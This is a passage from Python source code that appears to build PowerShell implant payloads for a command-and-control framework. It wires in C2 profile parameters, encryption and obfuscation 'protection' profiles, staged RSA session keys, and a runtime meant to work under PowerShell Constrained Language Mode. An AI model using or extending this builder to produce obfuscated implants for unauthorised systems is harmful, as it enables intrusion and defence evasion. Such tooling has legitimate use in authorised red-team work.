            staging_enabled = options.staging_enabled
            render_arguments = {
                "payload_uuid": self.uuid,
                "c2_profile_name": options.c2_profile_name,
                "c2_parameters": selected_c2.parameters,
                "codec_profile": options.codec_profile,
                "debug_logging": options.debug_logging,
                "command_names": list(options.command_names),
                "control_profile": control_profile,
            }
            if protection.profile == PROTECTION_NONE:
                payload_source = render_payload_source(
                    **render_arguments,
                    powershell_runtime=powershell_runtime,
                )
            else:
                if protection.key is None:  # defensive type narrowing
                    raise ValueError("Protected payload rendering requires key material")
                payload_source = render_protected_payload_source(
                    **render_arguments,
                    protection_profile=protection.profile,
                    protection_key=protection.key,
                    powershell_runtime=powershell_runtime,
                    staging_enabled=staging_enabled,
                )
            response.payload = payload_source.encode("utf-8")
            if protection.profile == PROTECTION_NONE:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload using "
                    f"{powershell_runtime} runtime source"
                )
            elif staging_enabled:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload with staged RSA "
                    f"session keys using {powershell_runtime} runtime source"
                )
            elif powershell_runtime == POWERSHELL_RUNTIME_CONSTRAINED:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload with "
                    "constrained-language runtime source and CLM-compatible "
                    "static protection"
                )
            else:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload using full-language "
                    "runtime source; protected profiles require Windows PowerShell "
                    "Full Language Mode"
                )
        except Exception as exc:  # pragma: no cover - exercised in integration
            response.set_status(BuildStatus.Error)
            response.build_stderr = str(exc)
        return response


__all__ = [
    "BuildParameter",
    "BuildParameterType",
    "BuildResponse",
    "BuildStatus",
    "C2ParameterDeviation",
    "InvalidPayloadOptions",
    "Nuwa",
    "PayloadOptionSelection",
    "CLM_CODEC_ROOT",
    "HTTP_TRANSPORT_PRESENTATIONS",
    "POWERSHELL_CODEC_PROFILES",
    "PROTECTED_PROFILES",
    "PROTECTION_AES256_HMAC_V1",
    "PROTECTION_CHOICES",
    "PROTECTION_HMAC_SHA256_V1",
    "PROTECTION_NONE",
    "PROTECTION_XOR_V1",
    "POWERSHELL_RUNTIME_CHOICES",
    "POWERSHELL_RUNTIME_CONSTRAINED",
    "POWERSHELL_RUNTIME_FULL",
    "PayloadType",
    "ProtectionSelection",
    "TransportEnvelopeSelection",
    "SupportedOS",
    "_coerce_powershell_runtime",
    "_codec_source_path",
    "_resolve_transport_envelope_selection",
    "_protection_source_paths",
    "_staging_source_path",
    "render_protected_payload_source",
    "render_payload_source",
]
